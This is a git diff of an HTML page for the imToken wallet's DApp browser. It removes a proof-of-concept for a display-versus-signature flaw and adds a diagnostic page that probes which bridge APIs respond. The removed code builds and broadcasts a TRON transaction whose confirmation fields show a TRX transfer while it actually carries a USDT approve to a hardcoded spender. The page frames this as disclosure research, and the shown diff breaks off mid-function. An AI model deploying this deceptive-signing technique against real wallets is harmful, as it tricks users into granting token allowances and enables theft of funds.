@@ -1,328 +1,757 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>imToken TRON 所见非所签漏洞验证（严格遵循文档）</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>imToken DApp API 探测页面</title>
   <style>
-    :root { --bg:#0b0f14; --card:#131a22; --border:#253040; --text:#e1e6ed; --text2:#8899aa; --red:#f04343; --orange:#e6a23c; --green:#2ecc71; --blue:#4d94ff; }
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body { background:var(--bg); color:var(--text); font-family:-apple-system,BlinkMacSystemFont,sans-serif; padding:16px; display:flex; flex-direction:column; gap:14px; }
-    .card { background:var(--card); border:1px solid var(--border); border-radius:14px; padding:18px; }
-    .card-header { font-weight:600; font-size:15px; margin-bottom:12px; display:flex; align-items:center; gap:8px; }
-    .dot { width:9px; height:9px; border-radius:50%; display:inline-block; }
-    .dot.red{background:var(--red)} .dot.green{background:var(--green)} .dot.orange{background:var(--orange)}
-    .row { display:flex; justify-content:space-between; align-items:flex-start; padding:6px 0; font-size:13px; border-bottom:1px solid rgba(255,255,255,0.05); }
-    .label { color:var(--text2); min-width:85px; }
-    .value { text-align:right; word-break:break-all; font-family:monospace; font-size:12px; }
-    .btn { width:100%; padding:14px 0; border-radius:10px; border:none; font-size:15px; font-weight:600; cursor:pointer; margin-top:10px; }
-    .btn-connect { background:var(--green); color:#000; }
-    .btn-normal { background:var(--blue); color:#fff; }
-    .btn-approve { background:var(--orange); color:#000; }
-    .btn-mixed { background:#e64343; color:#fff; }
-    .btn-check { background:var(--blue); color:#fff; }
-    .log-box { background:#090d13; border:1px solid var(--border); border-radius:10px; padding:10px; font-family:monospace; font-size:11px; max-height:380px; overflow-y:auto; color:#aab5c0; margin-top:8px; }
-    .log-line { padding:2px 0; }
-    .log-error { color:var(--red); }
-    .log-success { color:var(--green); }
-    .log-warn { color:var(--orange); }
-    .info-box { background:rgba(77,148,255,0.08); border:1px solid rgba(77,148,255,0.2); border-radius:8px; padding:10px; font-size:12px; color:var(--blue); margin-top:10px; }
-    .warning-box { background:rgba(240,67,67,0.08); border:1px solid rgba(240,67,67,0.2); border-radius:8px; padding:10px; font-size:12px; color:var(--red); margin-top:10px; }
-    .attribution { font-size:11px; color:var(--text2); text-align:center; margin-top:4px; }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 16px;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #0b1020;
+      color: #e5e7eb;
+    }
+    h1 { font-size: 22px; margin: 0 0 12px; }
+    h2 { font-size: 17px; margin: 22px 0 10px; }
+    .card {
+      background: #111827;
+      border: 1px solid #243044;
+      border-radius: 12px;
+      padding: 14px;
+      margin: 12px 0;
+    }
+    .row {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      align-items: center;
+      margin: 8px 0;
+    }
+    button {
+      border: 0;
+      border-radius: 8px;
+      padding: 10px 12px;
+      background: #2563eb;
+      color: #fff;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    button.warn { background: #b45309; }
+    button.danger { background: #b91c1c; }
+    button.gray { background: #374151; }
+    button.ok { background: #059669; }
+    button:disabled {
+      opacity: .5;
+      cursor: not-allowed;
+    }
+    input, textarea, select {
+      width: 100%;
+      border-radius: 8px;
+      border: 1px solid #374151;
+      background: #030712;
+      color: #e5e7eb;
+      padding: 10px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 13px;
+    }
+    textarea { min-height: 110px; }
+    pre {
+      white-space: pre-wrap;
+      word-break: break-word;
+      background: #030712;
+      border: 1px solid #243044;
+      padding: 12px;
+      border-radius: 10px;
+      max-height: 520px;
+      overflow: auto;
+      font-size: 12px;
+      line-height: 1.5;
+    }
+    .tag {
+      display: inline-block;
+      padding: 3px 7px;
+      border-radius: 999px;
+      font-size: 12px;
+      margin: 2px;
+      background: #374151;
+    }
+    .tag.ok { background: #065f46; }
+    .tag.fail { background: #7f1d1d; }
+    .tag.warn { background: #78350f; }
+    .small {
+      color: #9ca3af;
+      font-size: 13px;
+      line-height: 1.55;
+    }
+    .api-item {
+      border: 1px solid #243044;
+      border-radius: 10px;
+      padding: 10px;
+      margin: 8px 0;
+      background: #0f172a;
+    }
+    .api-title {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 13px;
+      color: #bfdbfe;
+    }
+    .success { color: #34d399; }
+    .failText { color: #f87171; }
+    .warnText { color: #fbbf24; }
   </style>
 </head>
 <body>
+  <h1>imToken DApp API 探测页面</h1>
 
   <div class="card">
-    <div class="card-header"><span class="dot red"></span> 完整的“所见非所签”攻击模型</div>
-    <div style="font-size:13px; color:var(--text2); line-height:1.6;">
-      ① <span class="highlight-green">普通 TRX 转账</span> – 验证 <code>tron.sendTransaction</code> 入口可用<br>
-      ② <span class="highlight-green">原始 USDT approve</span> – 验证合约调用正常<br>
-      ③ <span class="highlight-red">混合攻击</span> – 弹窗显示 TRX 转账，实际签署 USDT approve<br>
-      <br>
-      攻击核心：利用 <code>raw_data</code> 与 <code>raw_data_hex</code> 分离 + 数字字段覆盖<br>
-      <span style="color:var(--orange);">是否受影响取决于具体版本和平台，不保证所有 imToken 版本均可复现。</span>
+    <div class="small">
+      说明：这个页面用于测试当前 imToken DApp WebView 里到底能调用哪些接口。
+      默认自动测试只跑无转账、无授权的安全接口。涉及交易、签名、授权的接口只做空参数探测，不会构造真实交易。
     </div>
-    <div class="warning-box">
-      ⚠️ 本页面会真实签名并广播交易，请务必使用无资产测试钱包。
-    </div>
-  </div>
-
-  <div class="card" id="statusCard">
-    <div class="card-header"><span class="dot orange" id="dotStatus"></span> 钱包状态</div>
-    <div id="beforeConnect">
-      <div class="row"><span class="label">状态</span><span class="value">未连接</span></div>
-      <button class="btn btn-connect" id="btnConnect">连接 imToken 钱包</button>
-    </div>
-    <div id="afterConnect" style="display:none;">
-      <div class="row"><span class="label">地址</span><span class="value" id="addrText"></span></div>
-      <div class="row"><span class="label">TRX</span><span class="value" id="trxBal"></span></div>
-      <button class="btn btn-normal" id="btnNormal">① 普通 TRX 转账 (0.1 TRX)</button>
-      <button class="btn btn-approve" id="btnApprove">② 原始 USDT approve (1 USDT)</button>
-      <button class="btn btn-mixed" id="btnMixed">③ 混合攻击：显示转账，实际授权</button>
-      <button class="btn btn-check" id="btnCheckAllowance" style="margin-top:14px;">查询 USDT 授权额度</button>
-    </div>
-  </div>
-
-  <div class="card" id="allowanceCard" style="display:none;">
-    <div class="card-header"><span class="dot orange"></span> USDT 授权额度</div>
-    <div class="row"><span class="label">当前授权</span><span class="value" id="currentAllowance">--</span></div>
-    <div class="row"><span class="label">变化</span><span class="value" id="allowanceChange">--</span></div>
-    <div class="info-box">
-      若混合攻击后授权从 0 变为 1 USDT，则漏洞验证成功（需结合弹窗截图和 txid 作为完整证据）。
+    <div class="row">
+      <button onclick="detectEnv()">检测环境</button>
+      <button class="ok" onclick="runSafeTests()">自动测试安全接口</button>
+      <button class="warn" onclick="runSensitiveEmptyProbe()">敏感接口空参数探测</button>
+      <button class="gray" onclick="copyLog()">复制日志</button>
+      <button class="danger" onclick="clearLog()">清空日志</button>
     </div>
   </div>
 
   <div class="card">
-    <div class="card-header"><span class="dot orange"></span> 运行日志</div>
-    <div class="log-box" id="logContainer">等待操作…</div>
+    <h2>环境信息</h2>
+    <div id="envTags"></div>
+    <pre id="envInfo">还未检测</pre>
   </div>
 
-  <div class="attribution">仅供安全研究与负责任披露</div>
+  <div class="card">
+    <h2>手动调用 callPromisifyAPI</h2>
+    <div class="small">你可以手动填 API 名和参数。注意不要填真实交易 payload，除非你明确知道自己在做什么。</div>
+    <div class="row">
+      <input id="manualApi" placeholder="例如：device.getCurrentLanguage" />
+    </div>
+    <div class="row">
+      <textarea id="manualParams" placeholder='参数 JSON，例如：{}'></textarea>
+    </div>
+    <div class="row">
+      <button onclick="manualCall()">调用</button>
+      <button class="gray" onclick="fillExample('device.getCurrentLanguage', '{}')">语言示例</button>
+      <button class="gray" onclick="fillExample('device.getCurrentCurrency', '{}')">货币示例</button>
+      <button class="gray" onclick="fillExample('native.setClipboard', '{&quot;text&quot;:&quot;hello imToken&quot;}')">剪贴板示例</button>
+      <button class="gray" onclick="fillExample('navigator.getOrientation', '{}')">方向示例</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>常见 API 单项测试</h2>
+    <div id="apiList"></div>
+  </div>
+
+  <div class="card">
+    <h2>日志</h2>
+    <pre id="log"></pre>
+  </div>
 
 <script>
-(function() {
-  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-  const SPENDER = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';
-  const APPROVE_AMOUNT = '1000000'; // 1 USDT
-  const TRON_API = 'https://api.trongrid.io';
+(function () {
+  const $ = (id) => document.getElementById(id);
 
-  let walletAddr = '';
-  let initialAllowance = null;
+  const state = {
+    results: [],
+    startedAt: new Date().toISOString()
+  };
 
-  const $ = id => document.getElementById(id);
-  function log(msg, type = '') {
-    const div = document.createElement('div');
-    div.className = 'log-line' + (type ? ' log-' + type : '');
-    div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
-    $('logContainer').appendChild(div);
-    $('logContainer').scrollTop = $('logContainer').scrollHeight;
+  const SAFE_APIS = [
+    {
+      name: "device.getCurrentLanguage",
+      params: {},
+      note: "获取 imToken 当前语言，安全"
+    },
+    {
+      name: "device.getCurrentCurrency",
+      params: {},
+      note: "获取 imToken 当前法币单位，安全"
+    },
+    {
+      name: "navigator.getOrientation",
+      params: {},
+      note: "获取当前横竖屏方向，安全"
+    }
+  ];
+
+  const MANUAL_APIS = [
+    {
+      name: "native.alert",
+      params: { title: "测试", message: "这是 native.alert 测试" },
+      note: "会弹出 imToken 原生 alert"
+    },
+    {
+      name: "native.confirm",
+      params: { title: "测试", message: "这是 native.confirm 测试" },
+      note: "会弹出确认框"
+    },
+    {
+      name: "native.toast",
+      params: { message: "这是 toast 测试" },
+      note: "旧版文档出现过；部分版本可能不可用"
+    },
+    {
+      name: "native.setClipboard",
+      params: { text: "hello imToken" },
+      note: "复制文本到剪贴板"
+    },
+    {
+      name: "native.scanQRCode",
+      params: {},
+      note: "会打开扫码"
+    },
+    {
+      name: "native.share",
+      params: {
+        title: "imToken API 测试",
+        url: location.href,
+        description: "DApp WebView API 探测"
+      },
+      note: "会调起分享"
+    },
+    {
+      name: "native.selectPicture",
+      params: {},
+      note: "旧版文档出现过；可能请求相册权限"
+    },
+    {
+      name: "navigator.setTitle",
+      params: { title: "API 测试页" },
+      note: "设置 DApp 标题，部分版本可用"
+    },
+    {
+      name: "navigator.toggleNavbar",
+      params: { visible: true },
+      note: "显示/隐藏导航栏，部分版本可用"
+    },
+    {
+      name: "navigator.setOrientation",
+      params: { orientation: "portrait" },
+      note: "设置竖屏，部分版本可用"
+    },
+    {
+      name: "navigator.configure",
+      params: { title: "API 测试页" },
+      note: "旧版配置入口，部分版本可用"
+    },
+    {
+      name: "layout.setOptions",
+      params: {
+        title: "API 测试页",
+        navbar: { visible: true }
+      },
+      note: "新版 webview SDK 中出现的布局配置能力"
+    },
+    {
+      name: "user.showAccountSwitch",
+      params: {},
+      note: "调起账户切换页"
+    },
+    {
+      name: "navigator.goBack",
+      params: {},
+      note: "会触发返回，谨慎点"
+    },
+    {
+      name: "navigator.closeDapp",
+      params: {},
+      note: "会关闭当前 DApp，谨慎点"
+    }
+  ];
+
+  const SENSITIVE_EMPTY_PROBE_APIS = [
+    {
+      name: "transaction.signTransaction",
+      params: {},
+      note: "旧版交易签名入口；这里只传空参数探测，不构造交易"
+    },
+    {
+      name: "tron.sendTransaction",
+      params: {},
+      note: "TRON 候选入口；这里只传空参数探测"
+    },
+    {
+      name: "tron.signTransaction",
+      params: {},
+      note: "TRON 候选入口；这里只传空参数探测"
+    },
+    {
+      name: "wallet_addEthereumChain",
+      params: {},
+      note: "EVM 添加链入口；空参数一般会失败，但可判断接口是否被识别"
+    }
+  ];
+
+  function now() {
+    return new Date().toLocaleString();
   }
 
-  function hasBridge() {
-    return typeof window.imToken !== 'undefined' && typeof window.imToken.callPromisifyAPI === 'function';
+  function log(...args) {
+    const text = args.map(v => {
+      if (typeof v === "string") return v;
+      try { return JSON.stringify(v, null, 2); }
+      catch (e) { return String(v); }
+    }).join(" ");
+
+    $("log").textContent += `[${now()}] ${text}\n`;
+    $("log").scrollTop = $("log").scrollHeight;
   }
 
-  async function connect() {
-    log('检查钱包环境…', 'warn');
-    if (!hasBridge()) {
-      log('未检测到 imToken 桥接，请在 DApp 浏览器中打开', 'error');
-      return;
-    }
-    for (let i=0; i<10; i++) {
-      if (window.tronWeb?.ready) break;
-      await new Promise(r => setTimeout(r, 600));
-    }
-    if (window.tronWeb?.ready) {
-      walletAddr = window.tronWeb.defaultAddress.base58;
-    } else {
-      try {
-        const accounts = await window.imToken.callPromisifyAPI('tron_requestAccounts');
-        walletAddr = Array.isArray(accounts) && accounts.length ? accounts[0] : accounts;
-      } catch(e) {
-        log('获取地址失败: '+e.message, 'error');
-        return;
-      }
-    }
-    if (!walletAddr || walletAddr.length!==34) {
-      log('地址无效', 'error');
-      return;
-    }
-    $('addrText').textContent = walletAddr;
+  function clearLog() {
+    $("log").textContent = "";
+    state.results = [];
+  }
+
+  window.clearLog = clearLog;
+
+  function has(path) {
     try {
-      const resp = await fetch(TRON_API+'/v1/accounts/'+walletAddr);
-      const data = await resp.json();
-      $('trxBal').textContent = ((data.data?.[0]?.balance||0)/1e6).toFixed(2) + ' TRX';
-    } catch { $('trxBal').textContent = '--'; }
-    $('dotStatus').className = 'dot green';
-    $('beforeConnect').style.display = 'none';
-    $('afterConnect').style.display = 'block';
-    log('已连接: ' + walletAddr, 'success');
-    await refreshAllowanceUI(true);
-  }
-
-  // allowance 查询
-  async function queryAllowance(owner, spender) {
-    try {
-      const ownerHex = window.tronWeb.address.toHex(owner);
-      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
-      const result = await window.tronWeb.transactionBuilder.triggerConstantContract(
-        contractHex, 'allowance(address,address)', {},
-        [{type:'address',value:owner},{type:'address',value:spender}],
-        ownerHex
-      );
-      if (result?.constant_result?.[0]) return BigInt('0x'+result.constant_result[0]);
-      return null;
-    } catch(e) { log('查询 allowance 失败: '+e.message,'error'); return null; }
-  }
-  function formatAmount(wei) {
-    if (wei == null) return '--';
-    try { return (Number(wei)/1e6).toFixed(2)+' USDT'; } catch { return String(wei); }
-  }
-  async function refreshAllowanceUI(init=false) {
-    if (!walletAddr) return;
-    const allowance = await queryAllowance(walletAddr, SPENDER);
-    if (allowance == null) {
-      $('currentAllowance').textContent='查询失败';
-      $('allowanceChange').textContent='--';
-      return;
-    }
-    $('currentAllowance').textContent = formatAmount(allowance);
-    $('allowanceCard').style.display='block';
-    if (init) {
-      initialAllowance = allowance;
-      $('allowanceChange').textContent='初始值';
-    } else if (initialAllowance != null) {
-      const diff = allowance - initialAllowance;
-      if (diff > 0n) {
-        $('allowanceChange').textContent = '+' + formatAmount(diff);
-        $('allowanceChange').style.color='var(--red)';
-        log('⚠️ 授权额度增加！链上已执行 approve。','error');
-      } else {
-        $('allowanceChange').textContent = '无变化';
-      }
-    }
-  }
-
-  // 发送交易
-  async function sendTx(tx, desc) {
-    log(`发送 ${desc} …`,'warn');
-    try {
-      const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
-        tx, from: walletAddr, useTronHeader: true
-      });
-      log('返回: '+JSON.stringify(res),'success');
-      let rid = '';
-      if (typeof res === 'string') rid = res;
-      else if (res && typeof res === 'object') rid = res.txid || res.txID || res.result || '';
-      if (rid) {
-        log('✅ 交易已广播! TXID: '+rid,'success');
-        log('Tronscan: https://tronscan.org/#/transaction/'+rid,'info');
-        return true;
-      } else {
-        log('未返回 txid，可能失败','error');
-        return false;
-      }
-    } catch(e) {
-      log('错误: '+(e.message||''),'error');
-      log('完整: '+JSON.stringify(e),'error');
-      if (e.message?.includes('reject')) log('用户取消操作','warn');
+      return path.split(".").reduce((o, k) => o && o[k], window) !== undefined;
+    } catch (e) {
       return false;
     }
   }
 
-  // ① 普通 TRX 转账
-  async function normalTrx() {
-    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪','error'); return; }
-    log('构造普通 TRX 转账…','warn');
+  function getType(path) {
     try {
-      const tx = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
-      log('构造成功','success');
-      await sendTx(tx, '普通 TRX 转账');
-    } catch(e) { log('构造失败: '+(e.message||e),'error'); }
-  }
-
-  // ② 原始 USDT approve
-  async function originalApprove() {
-    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪','error'); return; }
-    log('构造原始 approve…','warn');
-    try {
-      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
-      const userHex = window.tronWeb.address.toHex(walletAddr);
-      const {transaction,result} = await window.tronWeb.transactionBuilder.triggerSmartContract(
-        contractHex, 'approve(address,uint256)',
-        { feeLimit:100_000_000, callValue:0 },
-        [{type:'address',value:SPENDER},{type:'uint256',value:APPROVE_AMOUNT}],
-        userHex
-      );
-      if (!result?.result) { log('生成失败','error'); return; }
-      log('原始 approve 构造成功','success');
-      await sendTx(transaction, '原始 USDT approve');
-    } catch(e) { log('构造失败: '+(e.message||e),'error'); }
-  }
-
-  // ③ 混合攻击（严格遵循文档）
-  async function mixedTx() {
-    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪','error'); return; }
-    log('构造混合攻击交易…','warn');
-    try {
-      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
-      const userHex = window.tronWeb.address.toHex(walletAddr);
-      const {transaction,result} = await window.tronWeb.transactionBuilder.triggerSmartContract(
-        contractHex, 'approve(address,uint256)',
-        { feeLimit:100_000_000, callValue:0 },
-        [{type:'address',value:SPENDER},{type:'uint256',value:APPROVE_AMOUNT}],
-        userHex
-      );
-      if (!result?.result) { log('approve 生成失败','error'); return; }
-
-      // 真实 approve 的 Any 参数
-      const realParam = transaction.raw_data.contract[0].parameter;
-      // 展示用的假 TransferContract 参数
-      const fakeParam = {
-        type_url: 'type.googleapis.com/protocol.TransferContract',
-        value: {
-          amount: 100000,          // 0.1 TRX
-          to_address: SPENDER,
-          owner_address: walletAddr
-        }
-      };
-
-      // 构建混合合约对象（完全对应文档描述）
-      const contractObj = {
-        // 普通展示字段（imToken 确认页使用）
-        type: 'TransferContract',
-        parameter: fakeParam,
-
-        // 填充字段，用于尝试影响 HashMap 顺序（未经当前节点验证）
-        _pad1: 'x',
-        _pad2: 'y',
-        _pad3: {},
-        _pad4: [],
-        _pad5: 0,
-        _pad6: null,
-        _pad7: '',
-        _pad8: false,
-        _pad9: 0xbeef,
-        _pad10: 'padding',
-
-        // 数字字段覆盖（对应 Protobuf 字段号 1 和 2）
-        '1': 'TriggerSmartContract',  // 字符串形式，如文档所示
-        '2': realParam                // 真实的 approve Any 参数
-      };
-
-      // 替换交易中的合约条目
-      transaction.raw_data.contract[0] = contractObj;
-
-      log('✔ 已构造数字字段覆盖，尚未验证节点解析结果','success');
-      log('raw_data_hex 中包含 095ea7b3 (仅检测到选择器)','success');
-
-      const ok = await sendTx(transaction, '混合攻击 (approve)');
-      if (ok) {
-        setTimeout(() => refreshAllowanceUI(false), 12000);
-      }
-    } catch(e) {
-      log('构造失败: '+(e.message||e),'error');
+      const val = path.split(".").reduce((o, k) => o && o[k], window);
+      return Object.prototype.toString.call(val).slice(8, -1);
+    } catch (e) {
+      return "Error";
     }
   }
 
-  async function manualCheck() {
-    if (!walletAddr) return;
-    log('手动查询 allowance…','warn');
-    await refreshAllowanceUI(false);
+  function safeKeys(obj, limit) {
+    try {
+      if (!obj) return [];
+      return Object.keys(obj).slice(0, limit || 80);
+    } catch (e) {
+      return ["读取失败：" + (e.message || e)];
+    }
   }
 
-  $('btnConnect').addEventListener('click', connect);
-  $('btnNormal').addEventListener('click', normalTrx);
-  $('btnApprove').addEventListener('click', originalApprove);
-  $('btnMixed').addEventListener('click', mixedTx);
-  $('btnCheckAllowance').addEventListener('click', manualCheck);
-
-  if (hasBridge()) {
-    log('imToken 桥接环境就绪', 'success');
-  } else {
-    log('请在 imToken DApp 浏览器中打开', 'warn');
+  function tag(text, type) {
+    const cls = type ? `tag ${type}` : "tag";
+    return `<span class="${cls}">${text}</span>`;
   }
+
+  function detectEnv() {
+    const imToken = window.imToken || null;
+    const ethereum = window.ethereum || null;
+    const tronWeb = window.tronWeb || null;
+    const tronLink = window.tronLink || null;
+
+    const info = {
+      url: location.href,
+      userAgent: navigator.userAgent,
+      time: new Date().toISOString(),
+
+      objects: {
+        "window.imToken": {
+          exists: !!imToken,
+          type: getType("imToken"),
+          keys: safeKeys(imToken)
+        },
+        "window.imToken.callAPI": {
+          exists: has("imToken.callAPI"),
+          type: getType("imToken.callAPI")
+        },
+        "window.imToken.callPromisifyAPI": {
+          exists: has("imToken.callPromisifyAPI"),
+          type: getType("imToken.callPromisifyAPI")
+        },
+        "window.ethereum": {
+          exists: !!ethereum,
+          type: getType("ethereum"),
+          keys: safeKeys(ethereum)
+        },
+        "window.tronWeb": {
+          exists: !!tronWeb,
+          type: getType("tronWeb"),
+          keys: safeKeys(tronWeb)
+        },
+        "window.tronLink": {
+          exists: !!tronLink,
+          type: getType("tronLink"),
+          keys: safeKeys(tronLink)
+        },
+        "window.tron": {
+          exists: !!window.tron,
+          type: getType("tron"),
+          keys: safeKeys(window.tron)
+        }
+      },
+
+      ethereumState: ethereum ? {
+        isMetaMask: ethereum.isMetaMask,
+        isImToken: ethereum.isImToken,
+        chainId: ethereum.chainId,
+        selectedAddress: ethereum.selectedAddress
+      } : null,
+
+      tronWebState: tronWeb ? {
+        ready: tronWeb.ready,
+        defaultAddress: tronWeb.defaultAddress || null,
+        fullNode: tronWeb.fullNode && tronWeb.fullNode.host,
+        solidityNode: tronWeb.solidityNode && tronWeb.solidityNode.host,
+        eventServer: tronWeb.eventServer && tronWeb.eventServer.host
+      } : null
+    };
+
+    const tags = [];
+    tags.push(tag("imToken: " + (!!imToken ? "存在" : "不存在"), !!imToken ? "ok" : "fail"));
+    tags.push(tag("callPromisifyAPI: " + (has("imToken.callPromisifyAPI") ? "存在" : "不存在"), has("imToken.callPromisifyAPI") ? "ok" : "fail"));
+    tags.push(tag("ethereum: " + (!!ethereum ? "存在" : "不存在"), !!ethereum ? "ok" : "fail"));
+    tags.push(tag("tronWeb: " + (!!tronWeb ? "存在" : "不存在"), !!tronWeb ? "ok" : "fail"));
+    tags.push(tag("tronLink: " + (!!tronLink ? "存在" : "不存在"), !!tronLink ? "ok" : "fail"));
+
+    $("envTags").innerHTML = tags.join("");
+    $("envInfo").textContent = JSON.stringify(info, null, 2);
+
+    log("环境检测完成", info);
+    return info;
+  }
+
+  window.detectEnv = detectEnv;
+
+  function getBridge() {
+    if (!window.imToken) {
+      throw new Error("window.imToken 不存在：请在 imToken DApp 浏览器内打开");
+    }
+    if (typeof window.imToken.callPromisifyAPI === "function") {
+      return {
+        type: "callPromisifyAPI",
+        fn: (apiName, params) => window.imToken.callPromisifyAPI(apiName, params)
+      };
+    }
+    if (typeof window.imToken.callAPI === "function") {
+      return {
+        type: "callAPI",
+        fn: (apiName, params) => new Promise((resolve, reject) => {
+          try {
+            window.imToken.callAPI(apiName, params, function (err, res) {
+              if (err) reject(err);
+              else resolve(res);
+            });
+          } catch (e) {
+            reject(e);
+          }
+        })
+      };
+    }
+    throw new Error("window.imToken 存在，但 callPromisifyAPI / callAPI 都不存在");
+  }
+
+  function withTimeout(promise, ms) {
+    return Promise.race([
+      promise,
+      new Promise((_, reject) => {
+        setTimeout(() => reject(new Error("调用超时 " + ms + "ms")), ms);
+      })
+    ]);
+  }
+
+  async function callImTokenApi(apiName, params, options) {
+    const opt = options || {};
+    const started = Date.now();
+
+    try {
+      const bridge = getBridge();
+      log("开始调用:", apiName, "参数:", params);
+
+      const res = await withTimeout(
+        Promise.resolve(bridge.fn(apiName, params)),
+        opt.timeout || 15000
+      );
+
+      const item = {
+        apiName,
+        ok: true,
+        bridge: bridge.type,
+        costMs: Date.now() - started,
+        params,
+        result: res
+      };
+      state.results.push(item);
+      log("✅ 成功:", apiName, item);
+      return item;
+    } catch (e) {
+      const item = {
+        apiName,
+        ok: false,
+        costMs: Date.now() - started,
+        params,
+        errorName: e && e.name,
+        errorMessage: e && (e.message || String(e)),
+        errorRaw: stringifyError(e)
+      };
+      state.results.push(item);
+      log("❌ 失败:", apiName, item);
+      return item;
+    }
+  }
+
+  function stringifyError(e) {
+    try {
+      if (!e) return null;
+      if (typeof e === "string") return e;
+      const out = {};
+      Object.getOwnPropertyNames(e).forEach(k => out[k] = e[k]);
+      return out;
+    } catch (_) {
+      return String(e);
+    }
+  }
+
+  async function runSafeTests() {
+    detectEnv();
+    log("开始自动测试安全接口，共", SAFE_APIS.length, "个");
+
+    for (const api of SAFE_APIS) {
+      await callImTokenApi(api.name, api.params, { timeout: 12000 });
+    }
+
+    await testEthereumSafe();
+    await testTronSafe();
+
+    log("安全接口测试完成");
+  }
+
+  window.runSafeTests = runSafeTests;
+
+  async function runSensitiveEmptyProbe() {
+    detectEnv();
+
+    const yes = confirm(
+      "这个操作只会用空参数探测敏感候选接口，不会构造真实交易。\n\n" +
+      "可能会返回 no transaction payload / 参数错误 / 接口不存在。\n\n" +
+      "确定继续吗？"
+    );
+    if (!yes) return;
+
+    log("开始敏感接口空参数探测，共", SENSITIVE_EMPTY_PROBE_APIS.length, "个");
+
+    for (const api of SENSITIVE_EMPTY_PROBE_APIS) {
+      await callImTokenApi(api.name, api.params, { timeout: 12000 });
+    }
+
+    log("敏感接口空参数探测完成");
+  }
+
+  window.runSensitiveEmptyProbe = runSensitiveEmptyProbe;
+
+  async function testEthereumSafe() {
+    if (!window.ethereum || typeof window.ethereum.request !== "function") {
+      log("window.ethereum 不存在或不支持 request，跳过 EVM provider 测试");
+      return;
+    }
+
+    const methods = [
+      { method: "eth_chainId", params: [] },
+      { method: "net_version", params: [] },
+      { method: "eth_accounts", params: [] }
+    ];
+
+    for (const item of methods) {
+      const started = Date.now();
+      try {
+        log("开始调用 ethereum.request:", item);
+        const res = await withTimeout(
+          window.ethereum.request(item),
+          12000
+        );
+        const record = {
+          apiName: "ethereum.request:" + item.method,
+          ok: true,
+          costMs: Date.now() - started,
+          result: res
+        };
+        state.results.push(record);
+        log("✅ EVM 成功:", record);
+      } catch (e) {
+        const record = {
+          apiName: "ethereum.request:" + item.method,
+          ok: false,
+          costMs: Date.now() - started,
+          errorMessage: e && (e.message || String(e)),
+          errorRaw: stringifyError(e)
+        };
+        state.results.push(record);
+        log("❌ EVM 失败:", record);
+      }
+    }
+  }
+
+  async function testTronSafe() {
+    if (!window.tronWeb) {
+      log("window.tronWeb 不存在，跳过 TRON provider 测试");
+      return;
+    }
+
+    try {
+      const tronInfo = {
+        ready: window.tronWeb.ready,
+        defaultAddress: window.tronWeb.defaultAddress || null
+      };
+      state.results.push({
+        apiName: "tronWeb.basicInfo",
+        ok: true,
+        result: tronInfo
+      });
+      log("✅ TRON 基础信息:", tronInfo);
+    } catch (e) {
+      log("❌ TRON 基础信息读取失败:", stringifyError(e));
+    }
+
+    if (window.tronWeb.trx && typeof window.tronWeb.trx.getCurrentBlock === "function") {
+      const started = Date.now();
+      try {
+        log("开始调用 tronWeb.trx.getCurrentBlock");
+        const block = await withTimeout(
+          window.tronWeb.trx.getCurrentBlock(),
+          15000
+        );
+        const record = {
+          apiName: "tronWeb.trx.getCurrentBlock",
+          ok: true,
+          costMs: Date.now() - started,
+          result: block && {
+            blockID: block.blockID,
+            number: block.block_header &&
+              block.block_header.raw_data &&
+              block.block_header.raw_data.number
+          }
+        };
+        state.results.push(record);
+        log("✅ TRON 当前区块成功:", record);
+      } catch (e) {
+        const record = {
+          apiName: "tronWeb.trx.getCurrentBlock",
+          ok: false,
+          costMs: Date.now() - started,
+          errorMessage: e && (e.message || String(e)),
+          errorRaw: stringifyError(e)
+        };
+        state.results.push(record);
+        log("❌ TRON 当前区块失败:", record);
+      }
+    }
+  }
+
+  function fillExample(apiName, paramsText) {
+    $("manualApi").value = apiName;
+    $("manualParams").value = paramsText;
+  }
+
+  window.fillExample = fillExample;
+
+  async function manualCall() {
+    const apiName = $("manualApi").value.trim();
+    const paramsText = $("manualParams").value.trim() || "{}";
+
+    if (!apiName) {
+      alert("请填写 API 名");
+      return;
+    }
+
+    let params;
+    try {
+      params = JSON.parse(paramsText);
+    } catch (e) {
+      alert("参数不是合法 JSON：" + e.message);
+      return;
+    }
+
+    await callImTokenApi(apiName, params, { timeout: 20000 });
+  }
+
+  window.manualCall = manualCall;
+
+  function renderApiList() {
+    const box = $("apiList");
+    const groups = [
+      ["安全接口，可自动测", SAFE_APIS, "ok"],
+      ["手动接口，可能弹窗/跳转/改页面", MANUAL_APIS, "warn"],
+      ["敏感候选接口，只建议空参数探测", SENSITIVE_EMPTY_PROBE_APIS, "danger"]
+    ];
+
+    box.innerHTML = groups.map(([title, list, type]) => {
+      return `
+        <h3>${title}</h3>
+        ${list.map(api => `
+          <div class="api-item">
+            <div class="api-title">${escapeHtml(api.name)}</div>
+            <div class="small">${escapeHtml(api.note || "")}</div>
+            <div class="small">默认参数：</div>
+            <pre>${escapeHtml(JSON.stringify(api.params, null, 2))}</pre>
